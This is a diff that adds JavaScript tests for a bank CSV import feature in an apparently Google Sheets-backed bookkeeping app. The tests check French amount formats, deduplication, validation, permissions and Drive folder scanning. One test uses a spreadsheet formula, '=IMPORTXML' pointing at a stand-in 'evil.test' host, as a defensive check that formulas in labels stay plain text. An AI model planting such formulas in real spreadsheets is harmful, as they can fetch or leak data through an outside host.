@@ -278,7 +278,7 @@ test('A2 : copie lisible des utilisateurs et réglages, audit durable', () => {
   b.call(ADMIN, 'company.update', company);
   assert.equal(book(b).tabs.Users.length, 3);
   assert.ok(book(b).tabs.Settings.some((r) => r[0] === 'legalName' && r[1] === 'Société Test'));
-  assert.ok(book(b).tabs.Settings.some((r) => r[0] === 'schemaVersion' && r[1] === 1));
+  assert.ok(book(b).tabs.Settings.some((r) => r[0] === 'schemaVersion' && r[1] >= 1));
   assert.ok(book(b).tabs.AuditLog.some((r) => r.includes('COMPANY_UPDATED')));
 });
 
@@ -336,4 +336,170 @@ test('A2 : le contrôle d\'installation essaie vraiment d\'écrire dans Drive et
   assert.equal(folder.trashed, true);
   const [file] = b.drive.files.values();
   assert.equal(file.trashed, true);
+});
+
+const CSV = 'Date;Libellé;Montant;Solde\n01/10/2026;SNCF;-98,00;1 000,00\n02/10/2026;Client;1 200,50;2 200,50\n';
+const MAP = { date: 'Date', label: 'Libellé', amount: 'Montant', balance: 'Solde' };
+const txs = (b) => book(b).tabs.BankTransactions.slice(1);
+const imp = (b, content = CSV, mapping = MAP) => b.call(ADMIN, 'bank.import', { fileName: 'r.csv', content, mapping });
+
+test('A3 : import, centimes entiers et formats français', () => {
+  const b = ready();
+  const r = imp(b);
+  assert.equal(r.data.added, 2);
+  assert.equal(txs(b)[0][5], -9800); assert.equal(txs(b)[1][5], 120050);
+  assert.equal(txs(b)[0][2], '2026-10-01');
+});
+
+test('A3 : le même fichier importé deux fois ne crée aucun doublon', () => {
+  const b = ready();
+  imp(b);
+  const r = imp(b);
+  assert.equal(r.data.added, 0); assert.equal(r.data.alreadyImported, true);
+  assert.equal(txs(b).length, 2);
+});
+
+test('A3 : deux paiements identiques réellement distincts sont conservés', () => {
+  const b = ready();
+  const csv = 'Date;Libellé;Montant\n05/10/2026;Café;-3,50\n05/10/2026;Café;-3,50\n';
+  assert.equal(imp(b, csv, { date: 'Date', label: 'Libellé', amount: 'Montant' }).data.added, 2);
+});
+
+test('A3 : un export qui chevauche le précédent n\'ajoute que le nouveau', () => {
+  const b = ready();
+  imp(b);
+  const r = imp(b, CSV + '03/10/2026;Loyer;-500,00;1 700,50\n');
+  assert.equal(r.data.added, 1); assert.equal(r.data.skipped, 2);
+});
+
+test('A3 : l\'identifiant bancaire prime sur l\'empreinte', () => {
+  const b = ready();
+  const map = { date: 'd', label: 'l', amount: 'm', sourceId: 'id' };
+  assert.equal(imp(b, 'id;d;l;m\nA;01/10/2026;X;-1,00\nB;01/10/2026;X;-1,00\n', map).data.added, 2);
+  assert.equal(imp(b, 'id;d;l;m\nB;01/10/2026;X modifié;-1,00\n', map).data.added, 0);
+});
+
+test('A3 : un CSV invalide laisse tout intact et produit un rapport', () => {
+  const b = ready();
+  imp(b);
+  const r = imp(b, 'Date;Libellé;Montant;Solde\n03/10/2026;A;-1,00;\n99/99/2026;B;-2,00;\n04/10/2026;C;abc;\n');
+  assert.equal(code(r), 'VALIDATION');
+  assert.ok(r.error.message.includes('2 ligne(s) en erreur'));
+  assert.equal(txs(b).length, 2);
+  assert.equal(book(b).tabs.BankImports.length, 3);
+  const p = b.call(ADMIN, 'bank.preview', { content: 'Date;Libellé;Montant\n03/10/2026;A\n', mapping: { date: 'Date', label: 'Libellé', amount: 'Montant' } });
+  assert.equal(p.data.report.errorCount, 1);
+});
+
+test('A3 : montants ambigus ou mal formés refusés', () => {
+  const b = ready();
+  for (const bad of ['1,234', '12,345', '1.2.3', '12a', '']) {
+    const r = imp(b, `Date;Libellé;Montant\n01/10/2026;A;${bad}\n`, { date: 'Date', label: 'Libellé', amount: 'Montant' });
+    assert.equal(code(r), 'VALIDATION', bad);
+  }
+  const map = { date: 'd', label: 'l', amount: 'm' };
+  const ok = [['1 234,56', 123456], ['1.234,56', 123456], ['1,234.56', 123456], ['-12.5', -1250], ['+7', 700], ['−3,10', -310], ['0,01', 1], ['(4,00)', -400], ['1 000 000,10 €', 100000010]];
+  ok.forEach(([text, cents], i) => {
+    const r = imp(b, `d;l;m\n01/10/2026;U${i};"${text}"\n`, map);
+    assert.equal(r.data.added, 1, text);
+    assert.equal(txs(b).at(-1)[5], cents, text);
+  });
+});
+
+test('A3 : colonnes débit et crédit séparées', () => {
+  const b = ready();
+  imp(b, 'd;l;deb;cre\n01/10/2026;A;50,00;\n02/10/2026;B;;20,00\n', { date: 'd', label: 'l', debit: 'deb', credit: 'cre' });
+  assert.deepEqual(txs(b).map((t) => t[5]), [-5000, 2000]);
+  assert.equal(code(imp(b, 'd;l;deb;cre\n03/10/2026;A;5,00;5,00\n', { date: 'd', label: 'l', debit: 'deb', credit: 'cre' })), 'VALIDATION');
+});
+
+test('A3 : séparateurs, guillemets, BOM, fins de ligne Windows', () => {
+  const b = ready();
+  const r = imp(b, '﻿d,l,m\r\n2026-10-01T08:00:00Z,"Paiement, avec ""virgule""\nsur 2 lignes",-1.00\r\n', { date: 'd', label: 'l', amount: 'm' });
+  assert.equal(r.data.added, 1);
+  assert.ok(txs(b)[0][4].includes('Paiement, avec "virgule"'));
+  assert.equal(txs(b)[0][2], '2026-10-01');
+});
+
+test('A3 : une formule dans un libellé reste du texte, une date reste une date texte', () => {
+  const b = ready();
+  imp(b, 'd;l;m\n01/10/2026;=IMPORTXML("http://evil.test");-1,00\n', { date: 'd', label: 'l', amount: 'm' });
+  assert.equal(txs(b)[0][4], '=IMPORTXML("http://evil.test")');
+  assert.equal(typeof txs(b)[0][2], 'string');
+});
+
+test('A3 : aucun format n\'est imposé, les colonnes doivent être confirmées', () => {
+  const b = ready();
+  const p = b.call(ADMIN, 'bank.preview', { content: CSV }).data;
+  assert.deepEqual(p.headers, ['Date', 'Libellé', 'Montant', 'Solde']);
+  assert.equal(p.suggested.amount, 'Montant');
+  assert.equal(txs(b).length, 0);
+  assert.equal(code(imp(b, CSV, { date: 'Date', label: 'Inconnue', amount: 'Montant' })), 'VALIDATION');
+  assert.equal(code(imp(b, CSV, { date: 'Date', amount: 'Montant' })), 'VALIDATION');
+  for (const bad of ['', 'pas de colonnes', 'a;b\n']) assert.equal(code(imp(b, bad)), 'VALIDATION');
+});
+
+test('A3 : droits et absence d\'espace', () => {
+  const b = ready();
+  b.call(ADMIN, 'users.save', { email: 'collab@example.test', role: 'collaborateur', active: true });
+  imp(b);
+  assert.equal(b.call('collab@example.test', 'bank.summary').ok, true);
+  assert.equal(b.call('collab@example.test', 'bank.list').data.total, 2);
+  for (const a of ['bank.import', 'bank.preview', 'bank.scanFolder']) assert.equal(code(b.call('collab@example.test', a, { content: CSV })), 'FORBIDDEN');
+  const c = createBackend();
+  assert.equal(c.call(ADMIN, 'bank.summary').data.ready, false);
+  assert.equal(code(c.call(ADMIN, 'bank.import', { content: CSV, mapping: MAP })), 'STORAGE_MISSING');
+});
+
+test('A3 : reprise après une coupure en cours d\'import', () => {
+  const b = ready();
+  imp(b);
+  const rows = book(b).tabs.BankImports;
+  rows.pop();
+  book(b).tabs.BankTransactions.pop();
+  const r = imp(b);
+  assert.equal(r.data.added, 1);
+  assert.equal(txs(b).length, 2);
+});
+
+test('A3 : solde du dernier relevé, entrées et sorties du mois, mois manquants', () => {
+  const b = ready();
+  const month = new Date().toISOString().slice(0, 7);
+  const [y, m] = month.split('-');
+  imp(b, `d;l;m;s\n05/${m}/${y};A;-10,00;900,00\n06/${m}/${y};B;30,00;930,00\n01/02/2025;C;-1,00;5,00\n15/05/2025;D;-1,00;4,00\n`, { date: 'd', label: 'l', amount: 'm', balance: 's' });
+  const s = b.call(ADMIN, 'bank.summary').data;
+  assert.equal(s.balanceCents, 93000); assert.equal(s.monthInCents, 3000); assert.equal(s.monthOutCents, 1000);
+  assert.equal(s.unmatched, 4); assert.ok(s.missingMonths.includes('2025-03')); assert.ok(s.missingMonths.includes('2025-04'));
+  assert.ok(s.lastImportAt);
+});
+
+test('A3 : dossier Drive, seulement avec des colonnes déjà confirmées', () => {
+  const b = ready();
+  const ids = JSON.parse(b.store.ORBIA_FOLDER_IDS);
+  const inbox = b.drive.folders.get(ids['01_Banque_Qonto/Imports_CSV']);
+  const archive = ids['01_Banque_Qonto/Archives_imports'];
+  const file = inbox.createFile('octobre.csv', CSV, 'text/csv');
+  let r = b.call(ADMIN, 'bank.scanFolder').data;
+  assert.equal(r.imported, 0); assert.deepEqual(r.waiting, ['octobre.csv']);
+  assert.equal(txs(b).length, 0);
+  imp(b, 'Date;Libellé;Montant;Solde\n09/09/2026;Avant;-1,00;1,00\n');
+  r = b.call(ADMIN, 'bank.scanFolder').data;
+  assert.equal(r.imported, 1); assert.equal(file.parent, archive); assert.equal(txs(b).length, 3);
+  const twice = b.call(ADMIN, 'bank.scanFolder').data;
+  assert.equal(twice.imported, 0); assert.equal(txs(b).length, 3);
+});
+
+test('A3 : un classeur A2 reçoit la nouvelle colonne sans perte', () => {
+  const b = ready();
+  const t = book(b).tabs.BankTransactions;
+  t[0].pop();
+  assert.equal(imp(b).data.added, 2);
+  assert.equal(book(b).tabs.BankTransactions[0].at(-1), 'balanceCents');
+});
+
+test('A3 : une sauvegarde du schéma précédent reste restaurable', () => {
+  const b = ready();
+  const id = b.call(ADMIN, 'storage.backup').data.backups[0].id;
+  b.drive.books.get(id).tabs.BankTransactions[0].pop();
+  assert.equal(b.call(ADMIN, 'storage.restoreTest').data.restoreTest.ok, true);
 });
